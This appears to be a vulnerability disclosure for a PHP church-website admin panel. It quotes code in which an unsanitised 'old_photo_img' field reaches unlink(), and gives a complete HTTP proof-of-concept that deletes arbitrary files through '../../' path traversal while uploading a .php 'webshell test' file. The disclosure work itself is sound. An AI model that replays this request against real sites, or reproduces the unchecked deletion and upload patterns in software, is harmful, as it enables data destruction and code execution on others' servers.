### Vulnerability file address

In line 52 of `church/admin/app/service.php`, `@unlink("../../assets/images/" . htmlspecialchars($_POST['old_photo_img'], ENT_QUOTES, 'UTF-8'))`,` $_POST['old_photo_img']` parameters have not been restricted, which causes any file to be deleted

```php
<?php
session_start();
include '../../assets/constant/config.php';

try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if (isset($_POST['submit'])) {

        $filepath = "../../assets/images/" . htmlspecialchars($_FILES["photo"]["name"], ENT_QUOTES, 'UTF-8');

        if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
            $img = htmlspecialchars($_FILES["photo"]["name"], ENT_QUOTES, 'UTF-8');
        } else {
            echo "Error !!";
        }


     


        $stmt = $conn->prepare("INSERT INTO `service`(`heading`,`short_content`,`photo` , `metatitle`,`metadescription`,`keywords`,`robots`) VALUES (?,?,?,?,?,?,?)");

        $stmt->execute([
           
            htmlspecialchars($_POST['heading'], ENT_QUOTES, 'UTF-8'),
            htmlspecialchars($_POST['short_content'], ENT_QUOTES, 'UTF-8'),
           
            $img,
        
            htmlspecialchars($_POST['metatitle'], ENT_QUOTES, 'UTF-8'),
            htmlspecialchars($_POST['metadescription'], ENT_QUOTES, 'UTF-8'),
            htmlspecialchars($_POST['keywords'], ENT_QUOTES, 'UTF-8'),
            htmlspecialchars($_POST['robots'], ENT_QUOTES, 'UTF-8'),
         
        ]);

        $_SESSION['success'] = "success";

        header("location:../manage_service.php");
    }

    if (isset($_POST['update'])) {
        // Update main photo
        if (!empty($_FILES['photo']['tmp_name'])) {
            $file_extension = pathinfo($_FILES["photo"]["name"], PATHINFO_EXTENSION);
            $new_filename = uniqid() . '.' . $file_extension;
            $filepath = "../../assets/images/" . $new_filename;
            if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
                $img = $new_filename;
                @unlink("../../assets/images/" . htmlspecialchars($_POST['old_photo_img'], ENT_QUOTES, 'UTF-8'));
            } 
```

### POC

```http
POST /church/admin/app/service.php HTTP/1.1
Host: www.church.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=kecn6qqrggjnvlpgliqeq951j0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 399

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo_img"

../../1.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo";filename="6666.php"

<?php echo "this is webshell test"; ?>
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--

```

### Attack results pictures

First, we create a `1.txt` file in the `church/` directory

![image-20250221165123765](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502211651804.png)



Then we execute the above poc to attack

![image-20250221165243521](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502211652559.png)



Files are deleted after the attack is successful

![image-20250221165258012](/Users/xianyu123/Library/Application%20Support/typora-user-images/image-20250221165258012.png)